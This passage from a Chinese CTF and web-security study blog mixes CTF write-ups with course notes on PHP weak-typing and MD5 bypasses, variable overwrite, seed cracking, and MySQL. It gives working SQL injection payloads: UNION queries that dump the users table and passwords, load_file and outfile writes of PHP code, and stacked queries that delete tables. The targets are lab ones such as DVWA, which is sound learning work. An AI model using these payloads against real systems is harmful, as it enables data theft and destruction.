src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519201416235.png" alt="image-20230519201410989"></p><p><strong>NSSCTF{6eb8d6fb-3f6b-44b8-8698-979458e6df93}</strong></p><h3 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h3><p>登陆页面 admin admin直接过</p><p>在上传文件处找到第二个彩蛋 <strong>_S0_ne3t?</strong></p><p>简单的文件上传</p><p>在上传文件处写入file:&#x2F;&#x2F;&#x2F;flag 上传-继续编辑 就可以看到flag</p><p><strong>NSSCTF{e2a030e7-c7f3-4587-a3b2-ea2243537015}</strong></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="easy-shark"><a href="#easy-shark" class="headerlink" title="easy_shark"></a>easy_shark</h3><p>首先压缩包含有伪加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524090146235.png" alt="image-20230524090146235"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524090158520.png" alt="image-20230524090158520"></p><p>修改后得到一个流量包</p><p>过滤http 在最后一个包中找到flag (前面是一堆fake的flag)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524090915381.png" alt="image-20230524090915381"></p><p>有一个方程组 解为17 和 77  gezx{j13p5oznp_1t_z_900y_k3z771h_k001} 看起来是什么加密</p><p>猜测是<strong>仿射密码</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524091412869.png" alt="image-20230524091412869"></p><pre><code>flag&#123;w13e5hake_1s_a_900d_t3a771c_t001&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524091840267.png" alt="image-20230524091840267"></p><p>在tcp流中可以找到上传了一句话木马文件</p><p>所以木马的key就是a</p><pre><code>flag&#123;w13e5hake_1s_a_900d_t3a771c_t001_a&#125;</code></pre><h3 id="两仪生四象"><a href="#两仪生四象" class="headerlink" title="两仪生四象"></a>两仪生四象</h3><p>拿到加密脚本 </p><p>其实现的过程是：截取了flag中大括号内的内容 将其每个字符转化为10个二进制字符 再将他们一起拼接到binary_text文件中 将binary_text文件中 每三位二进制字符 对应_reverse_hash表中的数字与卦象进行转换 保存在encode_text中 最后对其进行输出</p><pre><code class="python">_hash = &#123;&quot;乾&quot;: &quot;111&quot;, &quot;兑&quot;: &quot;011&quot;, &quot;离&quot;: &quot;101&quot;, &quot;震&quot;: &quot;001&quot;, &quot;巽&quot;: &quot;110&quot;, &quot;坎&quot;: &quot;010&quot;, &quot;艮&quot;: &quot;100&quot;, &quot;坤&quot;: &quot;000&quot;&#125;encoded_text = &quot;坤乾兑艮兑坎坤坤巽震坤巽震艮兑坎坤震兑乾坤巽坤艮兑震巽坤巽艮坤巽艮艮兑兑艮震兑乾坤乾坤坤兑艮艮坤巽坤坤巽坎坤兑离坎震艮兑坤巽坎艮兑震坤震兑乾坤乾坎坤兑坎坤震艮离坤离乾艮震艮巽震离震坤巽兑艮兑坎坤震巽艮坤离乾艮坎离坤震巽坎坤兑坤艮兑震巽震巽坎坤巽坤艮兑兑坎震巽兑&quot;text = &#39;&#39;binary_text = &quot;&quot;for char in encoded_text:    binary_text += _hash[char]formatted_binary_text = &quot; &quot;.join(binary_text[i:i+10] for i in range(0, len(binary_text), 10))print(formatted_binary_text)# 0001110111 0001101000 0000110001 0001100011 0001101000 0001011111 0001100001 0001100111 0000110100 0001101001 0001101110 0001011111 0001110000 0001110010 0000110000 0001100100 0001110101 0001100011 0001100101 0001100100 0001011111 0001110100 0001101000 0001100101 0001011111 0000110011 0001101001 0001100111 0001101000 0001110100 0001011111 0001010100 0001110010 0000110001 0001100111 0001110010 0001100001 0001101101 0001110011</code></pre><p>拿到在线二进制转文本工具中 得到flag内的结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524094505475.png" alt="image-20230524094505475"></p><p>NSSCTF{wh1ch_ag4in_pr0duced_the_3ight_Tr1grams}</p><h3 id="ssvvgg"><a href="#ssvvgg" class="headerlink" title="ssvvgg"></a>ssvvgg</h3><p>010editor打开发现base64  可以讲base64解码后在单独保存为一个文件 也可以找个工具直接梭 将base64转为图片</p><p><a href="base64%E8%BD%AC%E5%9B%BE%E7%89%87">https://feling.net/base64/</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524154633930.png" alt="image-20230524154633930"></p><p>保存为1.png</p><p>在图片尾部提示使用steghide 且密码为六位数字</p><p>使用sh脚本爆破可以得到密码为666666</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524173026457.png" alt="image-20230524173026457"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web实训技能听课笔记(持续更新中)</title>
      <link href="/2023/05/16/web%E5%AE%9E%E8%AE%AD%E6%8A%80%E8%83%BD%E5%90%AC%E8%AF%BE%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/05/16/web%E5%AE%9E%E8%AE%AD%E6%8A%80%E8%83%BD%E5%90%AC%E8%AF%BE%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="web实训技能听课笔记-持续更新中"><a href="#web实训技能听课笔记-持续更新中" class="headerlink" title="web实训技能听课笔记(持续更新中)"></a>web实训技能听课笔记(持续更新中)</h1><h2 id="web新手村"><a href="#web新手村" class="headerlink" title="web新手村"></a>web新手村</h2><p>1.请从本地访问——IP地址欺骗——添加类似X-Forwarded-For: 127.0.0.1等信息</p><p>2，请从google.com访问——添加Referer头 类似Referer: google.com</p><p>3.请使用ABC Browser——添加User-Agent(通过这个来判断访问使用的浏览器 也可以识别出是手机浏览器还是计算机浏览器) 类似User-Agent: ABC Browser</p><p>4.webshell——蚁剑——URL地址填环境名——找连接密码</p><p>5.弱类型</p><p>&#x3D;&#x3D;&#x3D; 在进行比较的时候 会先判断两种字符串的类型是否相等 在比较‘</p><p>&#x3D;&#x3D; 在进行比较的时候 会先将字符串类型转化成相同 在比较</p><p>(如果比较一个数字和字符串或者比较涉及到数字内容的字符串 则字符串会被转换成数值并且比较按照数值来进行)</p><p>eg. </p><pre><code class="php">var_dump(&quot;admin&quot;==0); //truevar_dump(&quot;1admin&quot;==1); //truevar_dump(&quot;admin1&quot;==1); //falsevar_dump(&quot;admin1&quot;==0); //truevar_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true</code></pre><p><font color="red">在识别字符串的每一个字符时 由左到右依次识别 第一次识别到字母的时候 后面会全部忽略 且判定为0</font></p><p><font color="red">“e”在php中识别为10的多少次方 是科学计数法 所以最后一个例子 0*10的多少次方都是0 故返回true</font></p><p>当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含<font color="red">‘.’  ‘,’  ‘e’ “E”</font>并且其数值值在整形的范围之内 该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。且由于被判断为非法数值 后面的内容也不在考虑是否含有”.” “,” “e” “E”</p><pre><code class="php">&lt;?php.$test=l + &quot;10.5&quot;;  // $test=11.5(float)$test=1+&quot;-1.3e3&quot;; //$test=-1299(float)$test=l+&quot;bob-1.3e3&quot;; //$test=1(int)$test=l+&quot;2admin&quot;; //$test=3(int)$test=l+&quot;admin2; //$test=1(int)?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230425090540.jpg" alt="微信图片_20230425090540"></p><h2 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h2><p>基础的 登陆的哈希验证</p><p>一.</p><pre><code class="php">$a != $bMd5($a) == Md5($b)</code></pre><p>要求传入两个不相等的字符串 但要求两个字符串的md5值一样</p><p>看到”&#x3D;&#x3D;” 想到弱类型判断 可以传入 两个md5值是”0e”开头的字符串 这 样会被识别为科学计数法 判断为0 所以md5值也一样</p><p>二.</p><pre><code class="php">$a != $bMd5($a) === Md5($b)</code></pre><p>md5()只能计算字符串(string)的MD5值 但是数组就不行了 返回值是null</p><p>可以利用null &#x3D;&#x3D;&#x3D; null来进行绕过 只要保证两个数组里面的内容不一样就可以了</p><pre><code class="php">a[]=1&amp;b[]=2</code></pre><p>三.</p><pre><code class="php">(string)$a != (string)$bMd5($a) === Md5($b)</code></pre><p>利用MD5碰撞 两个不同的东西会有相同的MD5</p><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p><p>四.</p><pre><code class="php">$md5 == md5($md5)</code></pre><p>积累内容</p><p>五.</p><pre><code class="php">intval($num) &lt; 2020 &amp;&amp; intval($num+1) &gt; 2021</code></pre><p>和php版本有关 php5会将对科学计数法取int 以常规字符串中数字和字母组合的方式识别出</p><p>但是先加一在取int 则不会</p><pre><code class="php">$num = 2e5intval($num); //2intval($num+1); //200001</code></pre><p>六.</p><p>浮点精度绕过</p><p><a href="http://172.30.211.91:8343/">http://172.30.211.91:8343/</a> Africa</p><pre><code class="php">$numPositive = intval($num)$numReverse = intval(strrev($num))l; //strrev就是逆序$num != $numPositive$numPositive === $numReverse &amp;&amp; !isPalindrom($num); //isPalindrom返回一个数的回文数 比如123回文数是321</code></pre><p>要求取整后的数和逆序后取整的数相等 且传入的num不能是回文数</p><p>最后一个条件很好满足 比如100.0010</p><p>但是在读取100.0010时 读完整数部分 遇到小数部分的0就会停止 识别为100 结果和取整是一样的</p><p>而逆序数0100.001取整还是100所以条件二满足了</p><p>条件一下面返回的是die 所以要求我们输入的num不能满足条件一对应的if条件 即应该是$num &#x3D;&#x3D; $numPositive</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230425151321618.png" alt="image-20230425151321618"></p><p>使用浮点精度绕过</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230425151809409.png" alt="image-20230425151809409"></p><p>由图可知 在小数点后16位 会超出php语言所能识别的精度 将1.0000000000000001判断为与1相等</p><p>因此 为了满足条件一二  我们应该输入的$num &#x3D; 1000000000000000.00000000000000010</p><p>七.</p><pre><code class="php">$md5 == md5(md5($md5))</code></pre><p>积累 跑脚本可以得出为0e1138100474 其实在前面加n个0也的满足的</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="Extract"><a href="#Extract" class="headerlink" title="Extract()"></a>Extract()</h3><p><strong>定义：</strong>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>该函数返回成功设置的变量数目。</p><p><strong>语法：</strong></p><p>extract(<em>array,extract_rules,prefix</em>)<br> 参数                                              描述<br> <em>array</em>必需。                         规定要使用的数组。<br> <em>extract_rules</em>可选。             extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。<br> 可能的值：<br> EXTR_OVERWRITE -        默认。如果有冲突，则覆盖已有的变量。<br> EXTR_SKIP -                     如果有冲突，不覆盖已有的变量。<br> EXTR_PREFIX_SAME -    如果有冲突，在变量名前加上前缀 prefix。<br> EXTR_PREFIX_ALL -        给所有变量名加上前缀 prefix。<br> EXTR_PREFIX_INVALID -仅在不合法或数字变量名前加上前缀 prefix。<br> EXTR_IF_EXISTS -           仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。<br> EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br> EXTR_REFS -                        将变量作为引用提取。导入的变量仍然引用了数组参数的值。</p><p><em>prefix</em>可选。                         如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。<br> 该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。</p><pre><code class="php">//将键值&quot;cat&quot;、&quot;dog&quot;、&quot;horse&quot;赋值给变量$a $b $c&lt;?php$a = &quot;original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;cat&quot;,&quot;b&quot; =&gt; &quot;dog&quot;,&quot;c&quot; =&gt; &quot;horse&quot;);extract($my_array);echo &quot;\$a = %a; \$b = $b; \$c = $c&quot;;?&gt;//$a = %a; $b = dog; $c = horse</code></pre><p>就是说 extract()使用了一个数组$my_array(其中<strong>array</strong>函数是用来创建数组的) 将其中的三个键值对 分别导入 </p><p>如果其中某个键名($a)存在且原来有内容 则extract函数会对其进行覆盖 </p><p>如果没有($b、$c) extract函数会创建这个键名并且将数组中键名对应的键值导入其中</p><p><strong>再举一个例子</strong></p><pre><code class="php">&quot;extract($_GET);if(isset($bdctf))&#123;$content=trim(file_get_contents($flag));//file_get_contents()将整个文件读入一个字符串if($bdctf==$content)                             //trim()去除字符串首尾处的空白字符（或者其他字符）&#123; echo&#39;bdctf&#123;**********&#125;&#39;; &#125;else&#123; echo&#39;这不是蓝盾的密码啊&#39;; &#125;&#125;&quot;</code></pre><p><strong>题目分析</strong><br>题目使用了**extract($_GET)<strong>接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用</strong>extract()**对变量进行覆盖，从而满足各个条件。</p><p><strong>解题思路</strong><br> if($bdctf&#x3D;&#x3D;$content) 输出flag<br> 利用<strong>extract($_GET)漏洞，使$bdctf与$content都为空或者不存在就满足 $bdctf&#x3D;&#x3D;$content</strong><br> <strong>get?flag&#x3D;&amp;bdctf&#x3D;  得到flag</strong></p><h3 id="Parse-str"><a href="#Parse-str" class="headerlink" title="Parse_str"></a>Parse_str</h3><p><strong>定义：</strong></p><p>把查询字符串解析到变量中</p><p><strong>语法：</strong></p><p><strong>parse_str(string,array)</strong><br>参数 描述<br><em>string</em>必需。 规定要解析的字符串。<br><em>array</em>可选。 规定存储变量的数组名称。该参数指示变量存储到数组中。</p><pre><code class="php">&lt;?php$a = 1;                  //原变量值为1parse_str(&#39;a=2&#39;);   //经过parse_str()函数后注册变量$a，重新赋值print_r($b);          //输出结果为2?&gt;</code></pre><p><strong>举个例子</strong></p><pre><code class="php">&lt;?phpif(!isset($_GET[&#39;id&#39;])) &#123;                    show_source(__FILE__);          die;                                          &#125;include (‘flag.php’);$a = “www.OPENCTF.com”;$id = $_GET[&#39;id&#39;];@parse_str($id);if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123;echo $flag;&#125; else &#123;exit(‘其实很简单其实并不难！’);&#125;?&gt;</code></pre><p><strong>题目分析</strong></p><p>首先 看到存在哈希比较 且是”&#x3D;&#x3D;”的弱比较 要求$a[0]的值不等于‘QNKCDZO’ 但是MD5值等于 </p><p>解一下可以发现 ‘QNKCDZO’的MD5值正好是<strong>0e830400451993494058024219903391</strong>可以进行哈希绕过 </p><p>随便找一个满足要求的字符串 比如<strong>s878926199a</strong> 其MD5值也是0e开头的 和 ‘QNKCDZO’的MD5值一样 都会被识别为0(科学计数法)</p><p>$id接受了get请求中的数据 而parse_str函数接受了$id 只要将数组a的值赋予$id 就可以成功覆盖$a[0] 满足题目要求的判断条件</p><p><strong>get?id&#x3D;$a[0]&#x3D;s878926199a</strong></p><h2 id="随机数问题"><a href="#随机数问题" class="headerlink" title="随机数问题"></a>随机数问题</h2><p>**mt_rand()**种子</p><p>mt_rand()函数用于生成随机数</p><p>mt_srand(seed)给随机数发生器播种 比如：</p><pre><code class="php">&lt;?phpmt_srand(123456);echo mt_rand();?&gt;//272665632</code></pre><p>原理就是 对于给定种子的随机数发生器 他计算出的随机数都是一样的 这样根据得到的随机数 我们可以使用<strong>php_mt_seed</strong>(在kali里面)脚本爆破出使用的种子 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230428103219947.png" alt="image-20230428103219947"></p><p>同时 根据php使用的版本不同 爆破出来的种子也不一样 按照不同题目可能两个都要试一下</p><p>此外  还有一种无需爆破得到种子的脚本 reverse_mt_rand.py</p><pre><code class="python">./reverse_mt_rand.py rand_n+0 rand_n+227 n flavour# rand_n+0 是选择的第一个随机数# rand_n+227 是选择的第二个随机数 第一二个随机数之间要间隔226个随机数# n的值是相对于最开始生成的第一个随机数 我们选择的第一个随机数是第几个数# flavour 如果是php5版本 就输入0 如果是php7以上的版本就输入1</code></pre><h2 id="数据库基本概念"><a href="#数据库基本概念" class="headerlink" title="数据库基本概念"></a>数据库基本概念</h2><p>数据库就是软件存放数据的一个空间</p><p>**数据库管理系统(DBMS)**是一种操纵和管理数据库的软件 用于建立使用和维护数据库 他对数据库进行统一的管理和控制 以保证数据库的安全性和完整性  <strong>mysql</strong>就是这样的一种数据库管理系统</p><p>主要分为两类：关系型数据库和非关系型数据库</p><p><strong>关系型数据库</strong>RDBMS:存储格式能直观反映实体间的关系 和创建的表格比较相似 表与表之间有着复杂的关联关系 比如 mysql oracle server access等</p><p><strong>非关系型数据库</strong>：分布式、非关系型的、不保证遵循ACID原则的数据存储系统 比如 mongodb redis hbase等</p><p><strong>SQL</strong> 结构化查询语言 </p><p>查询是人们用各种SQL指令构造出来的 负责具体完成筛选和提取结果数据的工作 包括增删改查</p><h2 id="Mysql基础"><a href="#Mysql基础" class="headerlink" title="Mysql基础"></a>Mysql基础</h2><p>数据类型：大致可以分为 数值、日期&#x2F;时间和字符串类型</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230502124537303.png" alt="image-20230502124537303"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230501203846050.png" alt="image-20230501203846050"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230501203952345.png" alt="image-20230501203952345"></p><p><strong>约束类型</strong>：</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230502124343739.png" alt="image-20230502124343739"></p><h3 id="常见的sql语句"><a href="#常见的sql语句" class="headerlink" title="常见的sql语句"></a><strong>常见的sql语句</strong></h3><p><strong>连接</strong>数据库：mysql -uroot -p；</p><p>**查询(显示)**所有的数据库：show databases；</p><p><strong>创建</strong>数据库：create database 库名；</p><p><strong>删除</strong>数据库：drop database 库名;</p><p><strong>查看(显示)<strong>当前数据库的所有表：show tables; 在用之前 要选择</strong>使用(打开)<strong>一个数据库</strong>use db_name</strong>；</p><p><strong>查看</strong>某个表的**描述(结构)**：desc 表名；</p><p>显示表中各<strong>字段信息</strong>，即表结构：show columns from table_name;</p><p>显示<strong>表创建过程</strong>：show create table 表名；</p><p>列出当前<strong>mysql的相关状态信息</strong>：status;</p><p><strong>清空</strong>数据表：delete from table_name; </p><p>或truncate table table_name;</p><p><strong>退出</strong>数据库：exit；</p><p>查询现在<strong>正在使用</strong>的数据库：select database();</p><p>操作：增减改查</p><p><strong>增</strong>：语法格式：insert into 表名（字段1，字段2，。。。。）values（值1，值2，。。。。）;</p><p>是一一对应的</p><p>插入多条数据：insert into 表名（字段1，字段2，。。。。）values（值1，值2，。。。。），（值3，值4，。。。。）;</p><pre><code class="mysql">insert into test(id,name,age) values(1,&#39;wenx1&#39;,18);</code></pre><p><strong>改</strong>：update 表名 set 字段名&#x3D;’值’ [where条件]</p><pre><code class="mysql">update test set age=&#39;28&#39; where id=1;</code></pre><p><strong>查</strong>：select * from 表名 [where条件]；</p><pre><code class="mysql">select * from test;   #*表示查询这张表中的全部字段(列)select GROUP_CONCAT(NAME,Population) from city where CountryCode=&#39;PSE&#39;;  #GROUP_CONCAT能将查询到的所有内容放在同一行 用“，”来区分</code></pre><p><strong>order by排序</strong></p><p>格式：select * from 表名 order by 列名(字段名)  </p><p>order by ｛column_name [ASC|DESC]} [,….n]   ASC为升序 DESC为降序   若后面加数字表示以第几列为基准做排序</p><p>特性：如果order by后的数字超过了原有的字段数(列数) 就会报错(可以用来sql注入里面猜当前数据表中有多少个字段)</p><pre><code class="mysql">select * from city order by ID asc;#假设当前数据表中有5个字段select * from cuty order by 5; #不会报错select * from cuty order by 6; #会报错</code></pre><p><strong>limit限制</strong></p><p>用于限制select语句返回指定的记录数 接受一个或两个数字参数</p><p>语法：select * from 表名 limit 偏移量，限制条数 </p><pre><code class="mysql">limit 5; #5代表限制条数limit 0,5; #0代表偏移量，5代表限制条数select * from table limit 5; #检索前5个记录行select * from table limit 5,10; #检索记录行6-15 注意在有偏移量的时候 从偏移量的下一行开始算限制条数</code></pre><p><strong>减</strong>：delete 表示删除一条数据 指的是物理删除 彻底在数据库中删除了  对比是逻辑删除 只是不显示在系统中 但数据库中依旧存在</p><p>delete from 表名 [where条件]</p><pre><code class="mysql">delete from test where id=1; #物理删除 update是逻辑删除</code></pre><p><strong>注释符</strong>：</p><pre><code class="mysql">#--+ 或 --空格/*.......*/</code></pre><p>其他操作：</p><pre><code class="mysql">select version(); / select @@version; #查看版本信息select user(); #返回当前使用数据库的用户 也就是网站配置文件中连接数据库的账号select session_user(); #查看连接数据库的用户名select system_user(); #查看系统用户名select database(); #查看当前数据库group_concat(); #把数据库中的某列数据或某几列数据合并为一个字符串select @@datair; #查看数据库路径</code></pre><p> <strong>information_schema</strong></p><p>mysql自带的数据库 可以提供mysql服务器所维护的所有其他数据库的信息 如数据库名 数据库的表 表的数据类型与访问权限等</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>就是将sql代码插入或添加到应用的输入参数中的攻击 之后再将这些参数传递给后台的sql服务加一解析并执行</p><p>产生条件：攻击者控制了sql语句的一部分 使用户的输入不再是一个输入参数 而成为了符合语法的sql语句</p><p>按回显方式划分：</p><p>有回显：</p><p>联合查询：构造联合查询语句 直接查看查询结果</p><p>报错注入：构造报错语句 在报错中查看结果</p><p>堆查询：多航语句执行 进而实现想要达到的目的</p><p>无回显：</p><p>盲注：布尔型&#x2F;时间型 通过某种手段“爆破”结果</p><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>使用DVWA进行sql注入联合查询测试</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230510090242654.png" alt="image-20230510090242654"></p><p>一.输入1</p><p>此时的sql语句为</p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39;    # 返回用户id为1的用户数据</code></pre><p>二.输入 1’ and ‘1’ &#x3D; ‘2</p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; and &#39;1&#39; = &#39;2&#39;  # 此时判断结果恒为假 无法测试出是否含有sql注入</code></pre><p>三.输入1’ or ‘1234’ &#x3D; ‘1234</p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; or &#39;1234&#39; = &#39;1234&#39;  # 条件判断恒为真 返回users表中的所有用户数据</code></pre><p>四.输入1’ or 1&#x3D;1 order by 1 #<strong>(这里的#是为了把sql语句中后面的单引号注释掉)</strong></p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; or 1=1 order by n #   # 用order by语句来猜测表中有多少字段 若报错 则说明字段数为n-1</code></pre><p>五.输入1’ union select 1,2 #</p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; union select 1,2 #   # 确定显示的字段顺序(可能出现有5个字段 但是只回显2个字段的情况)</code></pre><p>六.获取当前数据库中的情况</p><pre><code class="mysql">select first_name, last_name from users where user_id = &#39;1&#39; union select 1,databases() #    # 获取当前的数据库名select first_name, last_name from users where user_id = &#39;1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #    # 获取当前数据库的表名 select first_name, last_name from users where user_id = &#39;1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #       # 获取当前表中的字段名select first_name, last_name from users where user_id = &#39;1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #    # 查询数据</code></pre><p>其中**group_concat()**的作用就是将多行的数据在一行进行输出 并且用”,”分开    如果限制使用group_concat()就用limit 使用方法在上面常见的sql语句中</p><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>是一个信息数据库 保存着mysql服务器所维护的所有其他数据库的信息 比如数据库的名 数据库的表 表栏的数据类型与访问权限等 在其中 有数个只读表 它们实际上是视图 而不是基本表</p><p><font color="red"><strong>schemata表</strong></font></p><p>提供了当前mtsql实例中所有数据库的信息 show databases()的结果取于此表</p><p><font color="red"><strong>tables表</strong></font></p><p>提供了关于数据库中的表的信息 show tables from schemaname的结果取于此表</p><p><font color="red"><strong>columns表</strong></font></p><p>提供了表中字段的信息 show columns from schemaname.tablename的结果取于此表</p><p><strong>联合查询常用套路：</strong></p><p>1.orde by 猜列数(字段数)</p><p>2.union select 1,2,3,…,n n为上一步猜出来的列数  </p><p>3.查看哪几列回显出来了 比如有3列 其中2、3列回显了 1列没有回显 则可以输入union select database(),2,3; 用database()代替回显不出来的第一列 即可查询到数据库名</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>mysql服务器维护着两种变量 <strong>全局变量</strong>影响服务器的全局操作 <strong>会话变量</strong>影响具体客户端连接相关操作</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/MySQL%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E3%80%81%E5%A0%86%E5%8F%A0%E6%88%AA%E5%9B%BE__2023-05-11-20-45-16.png" alt="MySQL文件操作、宽字节、堆叠截图__2023-05-11-20-45-16"></p><p>可以使用show variables语句查看系统变量及其值</p><p>可以使用like进行匹配和筛选</p><pre><code class="mysql">show variables like &quot;a%&quot;  # 筛选以&quot;a&quot;开头的系统变量</code></pre><h4 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h4><p>对文件读写有影响</p><p>其参数是用来限制load data,select ….,outfile, load_file()等传到那个指定目录</p><p>当其值为null时 表示限制mysql不允许导入&#x2F;导出 *<em>默认是null</em></p><p>当其值为&#x2F;tmp&#x2F;时 表示限制mysql的导出&#x2F;导入只能发生在&#x2F;tmp&#x2F;下</p><p>当其为空值时 表示不对mysql的导入&#x2F;导出作出限制</p><p><strong>mysql读文件</strong></p><pre><code class="mysql">select load_file(&#39;文件名&#39;);select convert(load_file(&quot;文件路径&quot;) using utf8);</code></pre><p><strong>mysql写文件</strong></p><pre><code class="mysql">select &quot;&lt;php phpinfo();?&gt;&quot;(字符串) into outfile &quot;路径&quot;select &quot;&lt;php phpinfo();?&gt;&quot;(字符串) info dumpfile &quot;路径&quot;</code></pre><p><strong>outfile</strong>函数可以导出多行 而<strong>dumpfile</strong>只能导出一行数据</p><p><strong>outfile</strong>函数在将数据写到文件里是有特殊的格式转换 而<strong>dumpfile</strong>则保持原数据格式</p><p>比如原字符串中含有表示换行符的字符(0a)outfile会将其转化为\ 在输出 而dumpfile则直接输出原内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/MySQL%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E3%80%81%E5%A0%86%E5%8F%A0%E6%88%AA%E5%9B%BE__2023-05-11-21-11-53.png" alt="MySQL文件操作、宽字节、堆叠截图__2023-05-11-21-11-53"></p><p><strong>当然 这里的一切建立在secure_file_priv的值不为null的情况下  当其值为null的时候 想要进行文件读写 需要利用下面说到的堆叠注入</strong></p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p><strong>注意 通常多条语句执行时，若前条语句已返回数据 则之后的语句返回的数据通常无法返回前端页面 建议使用union联合注入 若无法使用联合注入 可考虑使用rename关键字 将想要的数据列名&#x2F;表名更改成返回数据的sql语句所定义的表&#x2F;列名(在下面强网杯的例题中有所体现)</strong></p><p>使用条件 API或者数据库引擎支持多条语句同时注入 即</p><pre><code class="mysql">multi_query($sql);</code></pre><p>mysql可以执行多条语句 多条语句之间用”;”做分隔 </p><p>因为分号为mysql语句的结束符 若在支持多条语句执行的情况下 可以利用此方法执行其他恶意语句 比如rname、drop、delete等 <strong>堆叠注入可以用于执行任何sql语句</strong></p><p>举个例子：执行查询时。第一个语句执行信息查询，第二个语句则将表user的所有内容删除了</p><pre><code class="mysql">select * from users where id=1;delect from users;</code></pre><p><strong>以2019年强网杯随便注为例</strong></p><p>**1.**在题目源码过滤了select等语句的时候 可以使用handler语句 他允许我们一行一行的浏览一个表中的数据 </p><p>使用格式：</p><pre><code class="mysql">handler users open as hh; #指定数据表进行载入并返回句柄handler hh read first; #读取指定句柄的第一行数据handler hh read next; #读取指定句柄的下一行数据handler hh close; #关闭句柄</code></pre><p>也可以不给表指定命名为句柄 就用表名即可</p><p>2.首先输入 <code>1</code>是有回显的</p><p>2.输入 <code>1&#39; and 1=2#</code>发现没有回显任何信息 说明存在sql注入</p><p>3.在输入<code>1‘ union select 1;</code>尝试进行联合查询 发现题目过滤掉了select update drop insert where等语句</p><p>4.使用堆叠注入</p><p><code>1&#39;; show tables</code>回显了当前数据库中的表的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230512154010134.png" alt="image-20230512154010134"></p><pre><code class="mysql">1&#39;; show columns from 